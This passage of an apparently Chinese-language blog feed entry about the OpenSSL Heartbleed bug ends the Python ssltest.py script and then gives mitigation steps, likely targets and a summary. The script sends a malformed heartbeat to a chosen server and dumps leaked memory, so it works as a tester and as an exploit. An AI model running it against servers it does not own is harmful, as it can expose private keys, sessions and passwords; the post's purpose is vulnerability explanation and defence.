+    &lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;recvall&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;ln&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;10&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;is&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Unexpected EOF receiving record payload - server closed connection&amp;#39;&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39; ... received message: type = &lt;/span&gt;&lt;span class=&#39;si&#39;&gt;%d&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;, ver = &lt;/span&gt;&lt;span class=&#39;si&#39;&gt;%04x&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;, length = &lt;/span&gt;&lt;span class=&#39;si&#39;&gt;%d&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;%&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;ver&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;len&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;))&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;ver&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt;
+
+&lt;span class=&#39;k&#39;&gt;def&lt;/span&gt; &lt;span class=&#39;nf&#39;&gt;hit_hb&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;):&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;send&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;hb&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;while&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;True&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;ver&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;recvmsg&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;is&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;No heartbeat response received, server likely not vulnerable&amp;#39;&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;False&lt;/span&gt;
+
+        &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;==&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;24&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Received heartbeat response:&amp;#39;&lt;/span&gt;
+            &lt;span class=&#39;n&#39;&gt;hexdump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;len&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;3&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+                &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;WARNING: server returned more data than it should - server is vulnerable!&amp;#39;&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;else&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+                &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Server processed malformed heartbeat, but did not return any extra data.&amp;#39;&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;True&lt;/span&gt;
+
+        &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;==&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;21&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Received alert:&amp;#39;&lt;/span&gt;
+            &lt;span class=&#39;n&#39;&gt;hexdump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Server returned error, likely not vulnerable&amp;#39;&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;False&lt;/span&gt;
+
+&lt;span class=&#39;k&#39;&gt;def&lt;/span&gt; &lt;span class=&#39;nf&#39;&gt;main&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;():&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;opts&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;args&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;options&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;parse_args&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;len&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;args&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;1&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;options&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;print_help&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt;
+
+    &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;socket&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;socket&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;socket&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;AF_INET&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;socket&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Connecting...&amp;#39;&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;sys&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;stdout&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;flush&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;connect&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;((&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;args&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;[&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;0&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;],&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;opts&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;port&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;))&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Sending Client Hello...&amp;#39;&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;sys&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;stdout&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;flush&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;send&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;hello&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Waiting for Server Hello...&amp;#39;&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;sys&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;stdout&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;flush&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;while&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;True&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;ver&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;recvmsg&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;==&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Server closed connection without sending Server Hello.&amp;#39;&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt;
+        &lt;span class=&#39;c&#39;&gt;# Look for server hello done message.&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;==&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;22&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;and&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;ord&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;pay&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;[&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;0&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;])&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;==&lt;/span&gt; &lt;span class=&#39;mh&#39;&gt;0x0E&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;break&lt;/span&gt;
+
+    &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Sending heartbeat request...&amp;#39;&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;sys&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;stdout&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;flush&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;send&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;hb&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;hit_hb&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+
+&lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;__name__&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;==&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;main&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;_2&quot;&gt;應對措施&lt;/h3&gt;
+
+&lt;p&gt;如果發現自己的伺服器有這樣的漏洞，該怎麼辦呢？&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;確認自己的 OpenSSL 版本是否在受害範圍&lt;/li&gt;
+
+&lt;li&gt;使用 ssltest.py 檢測工具檢測是否含有漏洞&lt;/li&gt;
+
+&lt;li&gt;更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2&lt;/li&gt;
+
+&lt;li&gt;重開所有與 OpenSSL 函式庫相關之服務&lt;/li&gt;
+
+&lt;li&gt;重新產生 SSL Private Key (因為 Private Key 可能藉由漏洞外洩)&lt;/li&gt;
+
+&lt;li&gt;將網站舊憑證撤銷&lt;/li&gt;
+
+&lt;li&gt;清除所有目前網頁伺服器上的 Session （因為可能遭到竊取）&lt;/li&gt;
+
+&lt;li&gt;必要時更換網站內使用者密碼，或是密切追蹤網站是否有帳號盜用的情況發生&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;詳細討論與建議可以參考 Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&quot;&gt;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;_3&quot;&gt;誰會是目標呢？&lt;/h3&gt;
+
+&lt;p&gt;真的會有攻擊者利用這樣的攻擊手法嗎？目前在&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲 wooyun&lt;/a&gt;平台上已經滿滿的資安研究員開始回報網站含有 OpenSSL 漏洞。也有駭客在嘗試撰寫更有效的攻擊利用程式，想要藉此把平常打不下來的網站一舉攻陷。&lt;/p&gt;
+
+&lt;p&gt;怎樣的站台會是重點目標呢？含有會員機制的網站特別如此，例如 Web Mail、社群網站等等。因此不少企業要多注意了，例如全世界最大的社群網站 Facebook、SlideShare、台灣知名電信公司網站、社交平台、網路銀行、NAS，都會在這波的攻擊範圍之內。如果沒有儘速修復，等到更有效的攻擊程式出現，就真的等著失血了。&lt;/p&gt;
+
+&lt;h3 id=&quot;_4&quot;&gt;小結&lt;/h3&gt;
+
+&lt;p&gt;就連 OpenSSL 這種歷史悠久而且重要的函式庫，都可能犯這種基本的 C 語言程式設計錯誤，老舊的程式碼一定有不少陳年遺毒，如果沒有徹底清查，類似的心臟噴血事件會不斷上演。大家快點止血吧！&lt;/p&gt;</content>
  </entry>
  
  <entry>
